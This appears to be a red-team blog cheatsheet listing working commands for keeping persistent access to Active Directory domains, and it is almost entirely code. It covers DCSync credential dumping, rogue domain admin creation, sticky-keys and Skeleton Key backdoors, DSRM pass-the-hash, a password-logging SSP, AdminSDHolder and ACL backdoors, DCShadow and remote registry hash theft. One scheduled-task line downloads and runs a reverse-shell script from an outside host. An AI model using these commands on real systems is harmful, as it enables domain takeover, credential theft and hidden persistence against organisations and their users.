---
title: Domain Persistence cheatsheet
subtitle: Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access.

# Summary for listings and search engines
summary: Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access.

# Link this post with a project
projects: []

# Date published
date: '2022-09-01T00:00:00Z'

# Date updated
lastmod: '2022-09-01T00:00:00Z'

# Is this an unpublished draft?
draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Giovanni Pecoraro**](https://unsplash.com/photos/CpkOjOcXdUY)'
  focal_point: ''
  placement: 2
  preview_only: false

authors:
  - admin

tags:
  - Red Teaming
  - Windows
  - Active Directory
  - Persistence
  
categories:
  - Cyber Security

---

The following techiniques require Domain Administrator privileges on the target domain.

## DCSync

```
.\mimikatz.exe
mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt
```

```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command “lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt”
```

## Adding domain admin user

```powershell
net user jeff.ridges FooBar123! /add /domain
net group "Administrators" jeff.ridges /add /domain
net group "Domain Admins" jeff.ridges /add /domain
net group "Enterprise Admins" jeff.ridges /add /domain
```

## Enabling plaintext credentials caching on DCs

```powershell
reg add "\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add "\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableDomainCreds /t REG_DWORD /d 0 /f
```

## Installing a sticky keys backdoor on DCs

```powershell
reg add "\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f");
```

## Scheduled Task

Schedule and execute a task (needs a Silver Ticket for the HOST service)

```powershell
schtasks /create /S "cyberlab-dc.cyberlab.cybercorp.local" /SC Minute /RU "NT Authority\SYSTEM" /TN "TASK_NAME" /TR "powershell.exe -ep bypass -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
schtasks /run /S "cyberlab-dc.cyberlab.cybercorp.local" /TN "TASK_NAME"
schtasks /delete /S "cyberlab-dc.cyberlab.cybercorp.local" /TN "TASK_NAME"
```

## Skeleton Key

Use the below command to inject a skeleton key (password would be *mimikatz*) on a Domain Controller of choice (DA privileges required)

```powershell
# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"misc::skeleton"' -ComputerName "COMPUTER1"
```

```
:: mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # misc::skeleton
```

Now, it is possible to access any machine with a valid username and password as *mimikatz*:

```powershell
Enter-PSSession -ComputerName "COMPUTER1" -Credential "cyberlab.cybercorp.local\Administrator"
```

In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:

```
:: mimikatz.exe
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !
```

## DSRM

There is a local administrator on every DC called *Administrator* whose password is the DSRM password. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.

Dump DSRM password (requires Domain Admin privileges):

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName "cyberlab-dc.cyberlab.cybercorp.local"
```

Enable logon through hash for DSRM:

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Since it is the local administrator of the DC, we can pass-the-hash to authenticate. Use below command to pass the hash (/domain: parameter needs machine and not domain name)

```powershell
# Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:[DC_FQDN] /user:Administrator /ntlm:[DSRM_NTLM_HASH] /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:cyberlab-dc.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

Now, it is possible to navigate through domain controller file system:

```powershell
ls \\cyberlab-dc.cyberlab.cybercorp.local\C$
```

## Custom SSP

Add mililib.dll library to log every account access. Drop the **mimilib.dll** to *system32* and add mimilib to *HKLMPackages*:

```powershell
packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

Using mimikatz, inject into lsass (Not stable with Server 2016):

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

Once the SSP is registered, all users who log on to the DC, and all local services will log their passwords to the **c:\Windows\System32\mimilsa.log** file.

## ACL Right Abuse

With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.

1. Check if the user has replication rights on the domain:
    
    ```powershell
    # PowerView
    Get-ObjectAcl -DistinguishedName "dc=cyberlab,dc=cybercorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "STUDENT1") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
    ```
    
2. Add FullControl rights to the domain object:
    
    ```powershell
    # PowerView
    Add-ObjectAcl -TargetDistinguishedName "DC=cyberlab,DC=cybercorp,DC=local" -PrincipalSamAccountName "STUDENT1" -Rights All -Verbose
    
    # ActiveDirectory Module
    Set-ADACL -DistinguishedName "DC=cyberlab,DC=cybercorp,DC=local" -Principal "STUDENT1" -Verbose
    ```
    
    or just add rights for DCSync and perform it:
    
    ```powershell
    # PowerView
    Add-ObjectAcl -TargetDistinguishedName "DC=cyberlab,DC=cybercorp,DC=local" -PrincipalSamAccountName "STUDENT1" -Rights DCSync -Verbose
    
    # ActiveDirectory Module
    Set-ADACL -DistinguishedName "DC=cyberlab,DC=cybercorp,DC=local" -Principal "STUDENT1" -GUIDRight DCSync -Verbose
    ```
    
3. Check if the rights have been correctly added:
    
    ```powershell
    # PowerView
    Get-ObjectAcl -DistinguishedName "dc=cyberlab,dc=cybercorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "STUDENT1") -and (($_.ObjectType -match "replication") -or ($_.ActiveDirectoryRights -match "GenericAll"))}
    ```
    
4. With replication rights the user can get the hash of *krbtgt*:
    
    ```powershell
    # Invoke-Mimikatz
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberlab\krbtgt"'
    ```
    

## AdminSDHolder

With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the members of groups like Domain Admins without actually being a member of it.

1. Check AdminSDHolder permissions (as normal user):
    
    ```powershell
    # PowerView
    Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System" | ?{$_.IdentityReference -like "CYBERLAB\STUDENT1"}
    
    # ActiveDirectory Module
    (Get-Acl -Path "AD:\CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local").Access | ?{$_.IdentityReference -like "CYBERLAB\STUDENT1"}
    ```
    
2. Add **FullControl** permissions for a user to the AdminSDHolder
    
    ```powershell
    # PowerView
    Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName "STUDENT1" -Rights All -Verbose
    
    # ActiveDirectory Module
    Set-ADACL -DistinguishedName "CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local" -Principal 'STUDENT1' -Verbose
    ```
    
    but there are also other interesting permissions (**ResetPassword**, **WriteMembers**) for a user to the AdminSDHolder:
    
    ```powershell
    # PowerView
    Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName "STUDENT1" -Rights ResetPassword -VerboseAdd-ObjectAcl -TargetADSprefix "CN=AdminSDHolder,CN=System" -PrincipalSamAccountName "STUDENT1" -Rights WriteMembers -Verbose
    ```
    
3. Run SDProp manually using Invoke-SDPropagator.ps1 (requires DA privileges):
    
    ```powershell
    # Pre-Server 2008 machines
    . .\Invoke-SDPropagator.ps1
    Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
    
    # Server 2008 and beyond
    . .\Invoke-SDPropagator.ps1
    Invoke-SDPropagator -timeoutMinutes 1 -Domain "CYBERLAB.LOCAL" -showProgress -Verbose
    ```
    
4. Verify the successful update of Domain Admins ACL (as normal user):
    
    ```powershell
    # PowerView
    Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -like "CYBERLAB\STUDENT1"}
    
    # ActiveDirectory Module
    (Get-Acl -Path "AD:\CN=Domain Admins,CN=Users,DC=cyberlab,DC=cybercorp,DC=local").Access | ?{$_.IdentityReference -like "CYBERLAB\STUDENT1"}
    ```
    
5. Once you have the requested permissions on desired objects, it is possible to abuse FullControl/WriteMember (running as the user previousely added) to add new users to the Domain Admins group:
    
    ```powershell
    # PowerView_dev
    Add-DomainGroupMember -Identity "Domain Admins" -Members "TESTDA" -Verbose
    
    # ActiveDirectory Module
    Add-ADGroupMember -Identity "Domain Admins" -Members "TESTDA"
    ```
    
    or perform ResetPassword (running as the user previousely added):
    
    ```powershell
    # PowerView_dev
    Set-DomainUserPassword -Identity "TESTDA" -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText Force -Force) -Verbose
    
    # ActiveDirectory Module
    Set-ADAccountPassword -Identity "TESTDA" -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText Force -Force) -Verbose
    ```
    

## DCShadow

1. Start a mimikatz session as SYSTEM and run the below commands to modify an attribute (in this case the SPN is set to “Replication/DC”:
    
    ```
    :: mimikatz.exe
    mimikatz # lsadump::dcshadow /object:STUDENT2 /attribute:servicePrincipalName /value:"Replication/DC"
    ```
    
2. Then from mimikatz impersonate a Domain Admin and push the attributes:
    
    ```
    :: mimikatz.exe
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::pth /user:Administrator /domain:cybercorp.local /ntlm:78603c228a04497e15e870688ea2e02d /impersonate
    mimikatz # lsadump::dcshadow /push
    ```
    
    If we would like to do the above without using DA, the only thing that changes is the “push”. Instead of running mimikatz as DA to push the attributes, we can use SetDCShadowPermissions to provide minimal rights to a user (STUDENT1) in order to change attributes to another user (STUDENT2). Keep in mind that, for once, we will still need to have DA privileges.
    
3. Run the below command from a PowerShell session running as DA:
    
    ```powershell
    . .\Set-DCShadowPermissions.ps1
    Set-DCShadowPermissions -FakeDC "fake-dc" -SamAccountName "STUDENT2" -Username "STUDENT1" -Verbose
    ```
    
4. Then as STUDENT1 run mimikatz and push the attributes:
    
    ```
    :: mimikatz.exe
    mimikatz # lsadump::dcshadow /push
    ```
    
5. In order to remove the just provided permissions:
    
    ```powershell
    . .\Set-DCShadowPermissions.ps1
    Set-DCShadowPermissions -FakeDC "fake-dc" -SamAccountName "STUDENT2" -Username "STUDENT1" -Verbose -Remove
    ```
    

## Windows Management Instrumentation (WMI)

ACLs can be modified to allow non-admin users access to securable objects.

Allow access permission on local machine for STUDENT1 user:

```powershell
# Nishang
Set-RemoteWMI -UserName "STUDENT1" -namespace "root\cimv2" -Verbose
```

Allow access permission on a remote machine for STUDENT1 without explicit credentials

```powershell
# Nishang
Set-RemoteWMI -UserName "STUDENT1" -ComputerName "DC" -namespace "root\cimv2" -Verbose
```

Allow access permission on a remote machine with explicit credentials. Only root2 and nested namespaces:

```powershell
# Nishang
Set-RemoteWMI -UserName "STUDENT1" -ComputerName "cyberlab-dc" -Credential "Administrator" -namespace "root\cimv2" -Verbose
```

Remove access permission on a remote machine remove permissions :

```powershell
# Nishang
Set-RemoteWMI -UserName "STUDENT1" -ComputerName "cyberlab-dc" -namespace "root\cimv2" -Remove -Verbose
```

## PowerShell Remoting

Allow PSRemoting access permission on local machine for STUDENT1:

```powershell
# Nishang
Set-RemotePSRemoting -UserName "STUDENT1" -Verbose
```

Allow PSRemoting access permission on a remote machine for STUDENT1 without credentials:

```powershell
# Nishang
Set-RemotePSRemoting -UserName "STUDENT1" -ComputerName "cyberlab-dc" -Verbose
```

Remove PSRemoting access permission on a remote machine for STUDENT1:

```powershell
# Nishang
Set-RemotePSRemoting -UserName "STUDENT1" -ComputerName "cyberlab-dc" -Remove
```

## Remote Registry

Using DAMP, with admin privileges on a remote machine, it is possible to implement a new remote registry backdoor that allows for the remote retrieval of a system"s machine and local account hashes, as well as its domain cached credentials.

```powershell
# DAMP
. .\Add-RemoteRegBackdoor.ps1
Add-RemoteRegBackdoor -ComputerName "cyberlab-dc" -Trustee "STUDENT1" -Verbose
```

As STUDENT1, abuse the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve:

1. The machine account hash for the specified machine:
    
    ```powershell
    # DAMP
    . .\RemoteHashRetrieval.ps1
    Get-RemoteMachineAccountHash -ComputerName "cyberlab-dc" -Verbose
    ```
    
2. The local SAM account hashes for the specified machine:
    
    ```powershell
    # DAMP
    . .\RemoteHashRetrieval.ps1
    Get-RemoteLocalAccountHash -ComputerName "cyberlab-dc" -Verbose
    ```
    
3. The domain cached credentials for the specified machine:
    
    ```powershell
    # DAMP
    . .\RemoteHashRetrieval.ps1
    Get-RemoteCachedCredential -ComputerName "cyberlab-dc" -Verbose
    ```
---